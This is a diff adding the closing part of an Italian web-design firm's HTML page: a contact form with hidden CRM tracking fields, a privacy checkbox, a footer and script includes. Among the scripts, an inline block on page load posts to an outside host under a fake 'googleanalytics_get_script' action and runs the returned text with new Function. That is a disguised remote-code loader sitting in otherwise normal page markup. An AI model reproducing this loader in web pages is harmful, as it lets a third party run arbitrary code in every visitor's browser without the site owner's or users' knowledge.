+                            <input name="campagnapadre" id="campagnapadre" type="hidden" value="InB-PPC_WebSite-google">
+                            <input name="canale" id="canale" type="hidden" value="Form">
+                            <input name="categoria" id="categoria" type="hidden" value="creazione-di-un-sito-web">
+                            <input name="scategoria" id="scategoria" type="hidden" value="siti web">
+                            <input name="psm_key" id="psm_key" type="hidden" value="siti web">
+                            <input name="data_lead" id="data_lead" type="hidden" value="30-10-2017_18:18:32">
+                            <!-- END Hidden CRM Tracking  -->
+                            <!-- END Hidden CRM Form -->
+
+
+                        </form>
+                    </div>
+                        </div>
+                        <div class="checkbox privacy">
+                            <label>
+                                <input name="privacy" id="privacy" required="required" type="checkbox" value="1" tabindex="8">
+                                Accetto che i miei dati siano trattati per finalità marketing come da <a class="popup-modal" href="privacy-modal.html" target="_blank">Informativa sulla privacy</a>.
+                            </label>
+                        </div>
+                        <center> <button type="submit" id="submit_btn" class="btn btn-primary btn-block" tabindex="9" style="width: 24%"><a href="mailto:ancoradesignweb@gmail.com">INVIA</a></button></center>
+
+
+
+
+        </div>
+        </div>
+
+
+
+
+        <div class="clear"></div>
+        <div id="footer" style="height: 200px">
+            <div id="footer-wrap">
+
+
+                <span class="left"><a href="" rel="home">Àncora Design Web</a></span>
+
+
+                <a href="https://www.facebook.com/ancoradesignweb/" target="_blank">
+                    <i class="fa fa-facebook fa-2x " aria-hidden="true" style="position: absolute; bottom: 33px; color: #1DA1F2; margin-left: -43px"> </i></a>
+
+                <center>
+                    <!--
+                    <a href="https://api.whatsapp.com/send?phone=393332976756" target="_blank">
+                        <i class="fa fa-whatsapp fa-2x " aria-hidden="true" style="position: absolute; bottom: 33px; color: green; margin-left: 25px"> </i></a>
+                    </a>
+                    -->
+                </center>
+                <span class="right"> <a href="" rel="home">Powered by Àncora Design Web</a></span>
+
+                <div class="footer-v4" id="footer-box">
+
+                    <div class="sidebar-footer">
+
+                    </div><!--copyright--><!--grid-container-->
+                </div><!--footer-->
+
+<a class="back-to-top" style="display: none;" href="#"><i class="fa fa-arrow-circle-up"></i></a>
+
+
+
+
+<script>
+    jQuery(document).ready(function () {
+        jQuery.post('https://www.vmthemes.com/preview/Initio?ga_action=googleanalytics_get_script', {action: 'googleanalytics_get_script'}, function(response) {
+            var F = new Function ( response );
+            return( F() );
+        });
+    });
+</script><script src="js/jquery.form.min.js" type="text/javascript"></script>
+<script type="text/javascript">
+    /* <![CDATA[ */
+    var _wpcf7 = {"recaptcha":{"messages":{"empty":"Please verify that you are not a robot."}}};
+    /* ]]> */
+</script>
+<script src="js/scripts.js" type="text/javascript"></script>
+<script src="js/custom.js" type="text/javascript"></script>
+<script src="js/unslider.js" type="text/javascript"></script>
+<script src="js/jquery.flexslider.js" type="text/javascript"></script>
+<script src="js/ideal-image-slider.js" type="text/javascript"></script>
+<script src="js/scrollup.js" type="text/javascript"></script>
+<script src="js/animation.js" type="text/javascript"></script>
+<script type="text/javascript">
+    /* <![CDATA[ */
+    var php_vars = {"slideshowSpeed":"5000","animationSpeed":"800"};
+    /* ]]> */
+</script>
+<script src="js/slides.js" type="text/javascript"></script>
+<script src="js/wp-embed.min.js" type="text/javascript"></script>
+<script src="js/owl.carousel.js" type="text/javascript"></script>
+<script src="js/fromblog.js" type="text/javascript"></script>
+
+</body></html>
